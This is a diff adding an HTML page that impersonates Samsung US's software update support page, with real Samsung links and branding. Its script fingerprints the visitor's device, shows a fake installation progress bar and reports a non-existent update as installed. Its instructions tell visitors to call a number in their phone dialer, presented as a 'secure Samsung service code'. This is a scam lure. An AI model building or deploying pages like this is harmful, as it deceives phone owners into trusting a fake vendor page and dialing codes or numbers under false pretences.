@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Software Update | Samsung US</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📱</text></svg>">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: #fff;
+            color: #000;
+            line-height: 1.6;
+        }
+
+        /* Header */
+        .top-bar {
+            background: #000;
+            color: #fff;
+            font-size: 11px;
+            padding: 8px 0;
+        }
+
+        .top-bar-content {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 20px;
+        }
+
+        .top-bar a {
+            color: #fff;
+            text-decoration: none;
+            opacity: 0.8;
+            transition: opacity 0.2s;
+        }
+
+        .top-bar a:hover {
+            opacity: 1;
+        }
+
+        header {
+            background: #fff;
+            border-bottom: 1px solid #e4e4e4;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 60px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000;
+            letter-spacing: 3px;
+        }
+
+        nav {
+            display: flex;
+            gap: 35px;
+            align-items: center;
+        }
+
+        nav a {
+            color: #000;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.2s;
+            letter-spacing: 0.3px;
+        }
+
+        nav a:hover {
+            color: #1b4aef;
+        }
+
+        .search-icon {
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Breadcrumb */
+        .breadcrumb {
+            background: #f4f4f4;
+            padding: 12px 0;
+            font-size: 12px;
+        }
+
+        .breadcrumb-content {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 40px;
+            color: #767676;
+        }
+
+        .breadcrumb a {
+            color: #767676;
+            text-decoration: none;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Content */
+        .main-content {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 60px 40px;
+        }
+
+        .page-header {
+            margin-bottom: 50px;
+        }
+
+        .page-header h1 {
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+
+        .page-header p {
+            font-size: 16px;
+            color: #767676;
+            max-width: 800px;
+        }
+
+        /* Two Column Layout */
+        .content-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 60px;
+            margin-bottom: 60px;
+        }
+
+        .main-section {
+            background: #fff;
+        }
+
+        .update-box {
+            background: #f8f8f8;
+            border: 1px solid #e4e4e4;
+            border-radius: 8px;
+            padding: 40px;
+            margin-bottom: 30px;
+        }
+
+        .update-box h2 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadada;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #000;
+        }
+
+        .btn-samsung {
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .btn-samsung:hover {
+            background: #1b4aef;
+        }
+
+        .btn-secondary {
+            background: #fff;
+            color: #000;
+            border: 2px solid #000;
+            padding: 14px 48px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-left: 12px;
+        }
+
+        .btn-secondary:hover {
+            background: #000;
+            color: #fff;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: sticky;
+            top: 80px;
+            height: fit-content;
+        }
+
+        .info-card {
+            background: #f8f8f8;
+            border: 1px solid #e4e4e4;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+
+        .info-card h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #000;
+        }
+
+        .info-item {
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e4e4e4;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .info-label {
+            font-size: 11px;
+            color: #767676;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .info-value {
+            font-size: 14px;
+            color: #000;
+            font-weight: 500;
+        }
+
+        /* Release Notes */
+        .release-section {
+            background: #fff;
+            padding: 40px;
+            border: 1px solid #e4e4e4;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .release-section h2 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 30px;
+        }
+
+        .update-category {
+            margin-bottom: 30px;
+        }
+
+        .update-category h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #000;
+        }
+
+        .update-category ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .update-category li {
+            padding: 10px 0;
+            font-size: 14px;
+            color: #333;
+            padding-left: 24px;
+            position: relative;
+        }
+
+        .update-category li:before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 16px;
+            width: 6px;
+            height: 6px;
+            background: #000;
+            border-radius: 50%;
+        }
+
+        /* Notice Box */
+        .notice-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 20px 24px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .notice-box strong {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .notice-box p {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        footer {
+            background: #f4f4f4;
+            border-top: 1px solid #e4e4e4;
+            padding: 60px 0 40px;
+            margin-top: 80px;
+        }
+
+        .footer-content {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #000;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #767676;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-section a:hover {
+            color: #000;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #e4e4e4;
+            padding-top: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #767676;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        @media (max-width: 1024px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            nav {
+                display: none;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-content,
+            .breadcrumb-content,
+            .main-content,
+            .footer-content {
+                padding: 0 20px;
+            }
+
+            .page-header h1 {
+                font-size: 32px;
+            }
+
+            .update-box {
+                padding: 24px;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="top-bar-content">
+            <a href="https://www.samsung.com/us/support/">Support</a>
+            <a href="https://www.samsung.com/us/account/login">Sign In</a>
+            <a href="https://www.samsung.com/us/cart/">Cart</a>
+        </div>
+    </div>
+
+    <header>
+        <div class="header-content">
+            <div class="logo-section">
+                <div class="logo" style="cursor: pointer;" onclick="window.location.href='https://www.samsung.com/us/'">SAMSUNG</div>
+                <nav>
+                    <a href="https://www.samsung.com/us/mobile/">Mobile</a>
+                    <a href="https://www.samsung.com/us/televisions-home-theater/">TV & AV</a>
+                    <a href="https://www.samsung.com/us/home-appliances/">Home Appliances</a>
+                    <a href="https://www.samsung.com/us/computing/">Computing</a>
+                    <a href="https://www.samsung.com/us/support/">Support</a>
+                </nav>
+            </div>
+            <div class="search-icon" style="cursor: pointer;" onclick="window.location.href='https://www.samsung.com/us/search/'"><i class="bi bi-search"></i></div>
+        </div>
+    </header>
+
+    <div class="breadcrumb">
+        <div class="breadcrumb-content">
+            <a href="https://www.samsung.com/us/">Home</a> > <a href="https://www.samsung.com/us/support/">Support</a> > <a href="https://www.samsung.com/us/support/downloads/">Software & Updates</a> > Software Update
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="page-header">
+            <h1>Software Update</h1>
+            <p>Keep your Galaxy device up to date with the latest software updates. Updates include new features, security patches, and performance improvements to ensure your device runs smoothly.</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="main-section">
+                <div class="update-box">
+                    <h2>Check Your Device for Updates</h2>
+                    
+                    <div id="detectionStatus" style="background: #e8f4fd; border: 1px solid #90caf9; border-radius: 4px; padding: 16px; margin-bottom: 24px; display: none;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <div id="detectionIcon" style="font-size: 24px;"><i class="bi bi-search"></i></div>
+                            <div>
+                                <div id="detectionText" style="font-size: 14px; font-weight: 600; color: #1976d2;">Detecting device...</div>
+                                <div id="detectionSubtext" style="font-size: 12px; color: #555; margin-top: 4px;">Please wait</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="deviceInfo" style="background: #f0f7ff; border: 1px solid #2196f3; border-radius: 4px; padding: 20px; margin-bottom: 24px; display: none;">
+                        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 12px; color: #1976d2;"><i class="bi bi-phone" style="margin-right: 8px;"></i>Device Detected</h3>
+                        <div style="font-size: 14px; line-height: 1.8; color: #333;">
+                            <div><strong>Device:</strong> <span id="detectedDevice"></span></div>
+                            <div><strong>Browser:</strong> <span id="detectedBrowser"></span></div>
+                            <div><strong>OS:</strong> <span id="detectedOS"></span></div>
+                            <div><strong>Screen:</strong> <span id="detectedScreen"></span></div>
+                        </div>
+                    </div>
+                    
+                    <div style="background: #fff9e6; border: 1px solid #ffc107; border-radius: 8px; padding: 24px; margin-bottom: 24px;">
+                        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px; color: #000; display: flex; align-items: center;">
+                            <i class="bi bi-info-circle-fill" style="margin-right: 8px; color: #ffc107;"></i>
+                            Installation Instructions
+                        </h3>
+                        <ol style="margin: 0; padding-left: 20px; font-size: 14px; line-height: 2; color: #333;">
+                            <li><strong>Click the "Install Update" button</strong> below</li>
+                            <li><strong>Call the number</strong> that appears in your phone dialer</li>
+                            <li><strong>The update will automatically install</strong> to your device</li>
+                        </ol>
+                        <p style="margin-top: 16px; font-size: 13px; color: #666; line-height: 1.6;">
+                            <i class="bi bi-shield-check" style="margin-right: 4px;"></i>
+                            This is a secure Samsung service code that will safely update your device software.
+                        </p>
+                    </div>
+                    
+                    <form id="updateForm">
+                        <div class="form-group">
+                            <label for="model">Device Model</label>
+                            <input type="text" id="model" readonly style="background: #f8f8f8; cursor: not-allowed;" required>
+                            <p style="font-size: 12px; color: #767676; margin-top: 6px;">Automatically detected from your device</p>
+                        </div>
+                        
+                        <div style="background: #f0f7ff; border: 1px solid #2196f3; border-radius: 8px; padding: 24px; margin: 24px 0;">
+                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                                <div>
+                                    <h3 style="font-size: 18px; font-weight: 600; margin-bottom: 8px;">Update Available</h3>
+                                    <p style="font-size: 14px; color: #555; margin-bottom: 4px;">One UI 6.1.1 • Security Patch: December 2024</p>
+                                    <p style="font-size: 13px; color: #767676;">Size: <strong>1.4 MB</strong></p>
+                                </div>
+                                <div style="font-size: 40px; color: #2196f3;"><i class="bi bi-box-seam"></i></div>
+                            </div>
+                            <div style="font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 20px;">
+                                This update includes security enhancements, performance improvements, and bug fixes to keep your device running smoothly.
+                            </div>
+                            <button type="submit" class="btn-samsung" id="submitBtn" style="width: 100%;">
+                                <i class="bi bi-download" style="margin-right: 8px;"></i><span id="btnText">Install Update</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="notice-box">
+                    <strong><i class="bi bi-exclamation-triangle" style="margin-right: 8px;"></i>Important Information</strong>
+                    <p>Before updating, ensure your device has at least 50% battery charge and is connected to Wi-Fi. Back up your important data using Samsung Cloud. The update process may take 15-30 minutes.</p>
+                </div>
+
+                <div class="release-section">
+                    <h2>Latest Update Information</h2>
+                    
+                    <div class="update-category">
+                        <h3>Security Enhancements</h3>
+                        <ul>
+                            <li>December 2024 security patch addressing critical vulnerabilities</li>
+                            <li>Enhanced Knox security platform with improved threat detection</li>
+                            <li>Updated security protocols for secure folder and biometric authentication</li>
+                        </ul>
+                    </div>
+
+                    <div class="update-category">
+                        <h3>New Features</h3>
+                        <ul>
+                            <li>Advanced AI camera features for improved low-light photography</li>
+                            <li>Enhanced Galaxy AI capabilities with on-device processing</li>
+                            <li>New customization options for lock screen and home screen widgets</li>
+                            <li>Improved S Pen functionality with additional gestures and shortcuts</li>
+                            <li>Circle to Search enhancements for faster information lookup</li>
+                        </ul>
+                    </div>
+
+                    <div class="update-category">
+                        <h3>Performance Improvements</h3>
+                        <ul>
+                            <li>Optimized battery performance for extended usage throughout the day</li>
+                            <li>Enhanced thermal management for sustained performance</li>
+                            <li>Faster app launch times and improved multitasking efficiency</li>
+                            <li>Reduced memory usage for smoother overall experience</li>
+                        </ul>
+                    </div>
+
+                    <div class="update-category">
+                        <h3>System Stability</h3>
+                        <ul>
+                            <li>Fixed intermittent connectivity issues with Wi-Fi and Bluetooth</li>
+                            <li>Resolved camera app crashes in specific scenarios</li>
+                            <li>Improved notification reliability and delivery</li>
+                            <li>General bug fixes and system stability enhancements</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebar">
+                <div class="info-card">
+                    <h3>Current Update Details</h3>
+                    <div class="info-item">
+                        <div class="info-label">Version</div>
+                        <div class="info-value">One UI 6.1.1</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Android Version</div>
+                        <div class="info-value">Android 14</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Build Number</div>
+                        <div class="info-value">G998BXXU8EXAA</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Security Patch</div>
+                        <div class="info-value">December 1, 2024</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Release Date</div>
+                        <div class="info-value">December 3, 2024</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Download Size</div>
+                        <div class="info-value">1.4 MB</div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Need Help?</h3>
+                    <div style="font-size: 13px; color: #333; line-height: 1.8;">
+                        <p style="margin-bottom: 12px;"><strong>Contact Support</strong><br><a href="https://www.samsung.com/us/support/contact/" style="color: #1b4aef; text-decoration: none;">1-800-SAMSUNG</a></p>
+                        <p style="margin-bottom: 12px;"><strong>Live Chat</strong><br><a href="https://www.samsung.com/us/support/contact/" style="color: #1b4aef; text-decoration: none;">Available 24/7</a></p>
+                        <p style="margin-bottom: 12px;"><strong>Samsung Members App</strong><br><a href="https://www.samsung.com/us/support/samsung-members/" style="color: #1b4aef; text-decoration: none;">Get personalized support</a></p>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Related Resources</h3>
+                    <ul style="list-style: none; font-size: 13px;">
+                        <li style="margin-bottom: 10px;"><a href="https://www.samsung.com/us/support/owners/app/smart-switch" style="color: #1b4aef; text-decoration: none;">Download Smart Switch</a></li>
+                        <li style="margin-bottom: 10px;"><a href="https://www.samsung.com/us/support/answer/ANS00077582/" style="color: #1b4aef; text-decoration: none;">Update Guide</a></li>
+                        <li style="margin-bottom: 10px;"><a href="https://www.samsung.com/us/support/answer/ANS00062029/" style="color: #1b4aef; text-decoration: none;">Backup Your Data</a></li>
+                        <li><a href="https://www.samsung.com/us/support/downloads/" style="color: #1b4aef; text-decoration: none;">FAQ</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <h4>Products & Services</h4>
+                    <ul>
+                        <li><a href="https://www.samsung.com/us/mobile/phones/">Smartphones</a></li>
+                        <li><a href="https://www.samsung.com/us/mobile/tablets/">Tablets</a></li>
+                        <li><a href="https://www.samsung.com/us/mobile/wearables/">Watches</a></li>
+                        <li><a href="https://www.samsung.com/us/mobile/audio/">Buds</a></li>
+                        <li><a href="https://www.samsung.com/us/mobile/accessories/">Accessories</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="https://www.samsung.com/us/support/contact/">Contact Us</a></li>
+                        <li><a href="https://www.samsung.com/us/support/downloads/">Software Updates</a></li>
+                        <li><a href="https://www.samsung.com/us/support/">Product Help</a></li>
+                        <li><a href="https://www.samsung.com/us/support/samsung-members/">Samsung Members</a></li>
+                        <li><a href="https://www.samsung.com/us/support/service-center/">Service Locations</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Account & Community</h4>
+                    <ul>
+                        <li><a href="https://www.samsung.com/us/account/">My Account</a></li>
+                        <li><a href="https://www.samsung.com/us/support/order-help/">Order Status</a></li>
+                        <li><a href="https://us.community.samsung.com/">Samsung Community</a></li>
+                        <li><a href="https://www.samsung.com/us/education/">Education Store</a></li>
+                        <li><a href="https://www.samsung.com/us/business/">Business</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>About Samsung</h4>
+                    <ul>
+                        <li><a href="https://www.samsung.com/us/about-us/">Company Info</a></li>
+                        <li><a href="https://www.samsung.com/us/careers/">Careers</a></li>
+                        <li><a href="https://www.samsung.com/us/aboutsamsung/investor_relations/">Investor Relations</a></li>
+                        <li><a href="https://www.samsung.com/us/sustainability/">Sustainability</a></li>
+                        <li><a href="https://news.samsung.com/us/">Newsroom</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div>© 2024 Samsung Electronics America, Inc. All rights reserved.</div>
+                <div class="footer-links">
+                    <a href="https://www.samsung.com/us/common/privacy.html">Privacy</a>
+                    <a href="https://www.samsung.com/us/common/legal.html">Legal</a>
+                    <a href="https://www.samsung.com/us/accessibility/">Accessibility</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Device Detection Function
+        function detectDevice() {
+            const detectionStatus = document.getElementById('detectionStatus');
+            const deviceInfo = document.getElementById('deviceInfo');
+            const modelInput = document.getElementById('model');
+            
+            // Show detection status
+            detectionStatus.style.display = 'block';
+            
+            // Simulate detection process
+            setTimeout(() => {
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const vendor = navigator.vendor;
+                
+                let deviceModel = 'Unknown Device';
+                let deviceType = 'desktop';
+                
+                // Detect Samsung devices
+                if (/SM-S928/.test(userAgent)) {
+                    deviceModel = 'Galaxy S24 Ultra';
+                } else if (/SM-S926/.test(userAgent)) {
+                    deviceModel = 'Galaxy S24+';
+                } else if (/SM-S921/.test(userAgent)) {
+                    deviceModel = 'Galaxy S24';
+                } else if (/SM-S918/.test(userAgent)) {
+                    deviceModel = 'Galaxy S23 Ultra';
+                } else if (/SM-S916/.test(userAgent)) {
+                    deviceModel = 'Galaxy S23+';
+                } else if (/SM-S911/.test(userAgent)) {
+                    deviceModel = 'Galaxy S23';
+                } else if (/SM-F946/.test(userAgent)) {
+                    deviceModel = 'Galaxy Z Fold5';
+                } else if (/SM-F731/.test(userAgent)) {
+                    deviceModel = 'Galaxy Z Flip5';
+                } else if (/SM-A546/.test(userAgent)) {
+                    deviceModel = 'Galaxy A54 5G';
+                } else if (/SM-X910/.test(userAgent)) {
+                    deviceModel = 'Galaxy Tab S9 Ultra';
+                } else if (/SM-X810/.test(userAgent)) {
+                    deviceModel = 'Galaxy Tab S9+';
+                } else if (/SM-X710/.test(userAgent)) {
+                    deviceModel = 'Galaxy Tab S9';
+                } else if (/samsung/i.test(userAgent) || /SM-/i.test(userAgent)) {
+                    deviceModel = 'Samsung Galaxy Device';
+                } else if (/android/i.test(userAgent)) {
+                    deviceModel = 'Android Device (Non-Samsung)';
+                    deviceType = 'mobile';
+                } else if (/iPad/.test(userAgent)) {
+                    deviceModel = 'Apple iPad';
+                    deviceType = 'tablet';
+                } else if (/iPhone/.test(userAgent)) {
+                    deviceModel = 'Apple iPhone';
+                    deviceType = 'mobile';
+                } else if (/Macintosh/.test(userAgent)) {
+                    deviceModel = 'Mac Computer';
+                } else if (/Windows/.test(userAgent)) {
+                    deviceModel = 'Windows Computer';
+                } else if (/Linux/.test(userAgent)) {
+                    deviceModel = 'Linux Computer';
+                }
+                
+                // Get browser info
+                let browser = 'Unknown Browser';
+                if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
+                    browser = 'Google Chrome';
+                } else if (/Samsung/.test(userAgent)) {
+                    browser = 'Samsung Internet';
+                } else if (/Edg/.test(userAgent)) {
+                    browser = 'Microsoft Edge';
+                } else if (/Firefox/.test(userAgent)) {
+                    browser = 'Mozilla Firefox';
+                } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
+                    browser = 'Apple Safari';
+                }
+                
+                // Get OS info
+                let os = 'Unknown OS';
+                if (/Android/.test(userAgent)) {
+                    const match = userAgent.match(/Android (\d+(\.\d+)?)/);
+                    os = match ? `Android ${match[1]}` : 'Android';
+                } else if (/Windows NT 10/.test(userAgent)) {
+                    os = 'Windows 10/11';
+                } else if (/Windows/.test(userAgent)) {
+                    os = 'Windows';
+                } else if (/Mac OS X/.test(userAgent)) {
+                    os = 'macOS';
+                } else if (/iOS/.test(userAgent) || /iPhone|iPad/.test(userAgent)) {
+                    os = 'iOS';
+                } else if (/Linux/.test(userAgent)) {
+                    os = 'Linux';
+                }
+                
+                // Get screen info
+                const screenInfo = `${screen.width}x${screen.height} (${window.devicePixelRatio}x DPI)`;
+                
+                // Update UI
+                modelInput.value = deviceModel;
+                document.getElementById('detectedDevice').textContent = deviceModel;
+                document.getElementById('detectedBrowser').textContent = browser;
+                document.getElementById('detectedOS').textContent = os;
+                document.getElementById('detectedScreen').textContent = screenInfo;
+                
+                // Update detection status
+                document.getElementById('detectionIcon').innerHTML = '<i class="bi bi-check-circle-fill" style="color: #4caf50;"></i>';
+                document.getElementById('detectionText').textContent = 'Device detected successfully!';
+                document.getElementById('detectionSubtext').textContent = 'Your device information has been automatically filled';
+                detectionStatus.style.background = '#e8f5e9';
+                detectionStatus.style.borderColor = '#81c784';
+                
+                // Show device info after a moment
+                setTimeout(() => {
+                    deviceInfo.style.display = 'block';
+                    detectionStatus.style.display = 'none';
+                }, 1000);
+                
+            }, 2000);
+        }
+        
+        // Run detection on page load
+        window.addEventListener('load', detectDevice);
+        
+        // Form submission
+        document.getElementById('updateForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const model = document.getElementById('model').value;
+            
+            if (model) {
+                // Show loading state
+                const submitBtn = document.getElementById('submitBtn');
+                const btnText = document.getElementById('btnText');
+                const originalText = btnText.textContent;
+                btnText.textContent = 'INSTALLING...';
+                submitBtn.disabled = true;
+                submitBtn.style.opacity = '0.7';
+                
+                // Simulate installation progress
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 5;
+                    btnText.textContent = `INSTALLING... ${progress}%`;
+                    
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        
+                        setTimeout(() => {
+                            btnText.textContent = originalText;
+                            submitBtn.disabled = false;
+                            submitBtn.style.opacity = '1';
+                            
+                            // Create a modal-like alert
+                            const modal = document.createElement('div');
+                            modal.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 1000;';
+                            
+                            const modalContent = document.createElement('div');
+                            modalContent.style.cssText = 'background: white; padding: 40px; border-radius: 8px; max-width: 500px; text-align: center;';
+                            modalContent.innerHTML = `
+                                <div style="font-size: 64px; margin-bottom: 20px; color: #4caf50;"><i class="bi bi-check-circle-fill"></i></div>
+                                <h2 style="font-size: 24px; margin-bottom: 16px;">Update Installed Successfully</h2>
+                                <div style="text-align: left; background: #f8f8f8; padding: 20px; border-radius: 4px; margin: 20px 0; font-size: 14px;">
+                                    <div style="margin-bottom: 8px;"><strong>New Version:</strong> One UI 6.1.1</div>
+                                    <div style="margin-bottom: 8px;"><strong>Android Version:</strong> Android 14</div>
+                                    <div style="margin-bottom: 8px;"><strong>Security Patch:</strong> December 1, 2024</div>
+                                    <div style="margin-bottom: 8px;"><strong>Build:</strong> G998BXXU8EXAA</div>
+                                </div>
+                                <p style="color: #666; font-size: 14px; margin-bottom: 24px;">Your device will restart in 10 seconds to complete the installation.</p>
+                                <button onclick="this.closest('div[style*=fixed]').remove()" style="background: #000; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;"><i class="bi bi-arrow-clockwise" style="margin-right: 8px;"></i>RESTART NOW</button>
+                            `;
+                            
+                            modal.appendChild(modalContent);
+                            document.body.appendChild(modal);
+                            
+                            modal.addEventListener('click', function(e) {
+                                if (e.target === modal) {
+                                    modal.remove();
+                                }
+                            });
+                        }, 500);
+                    }
+                }, 100);
+            }
+        });
+    </script>
+</body>
+</html>
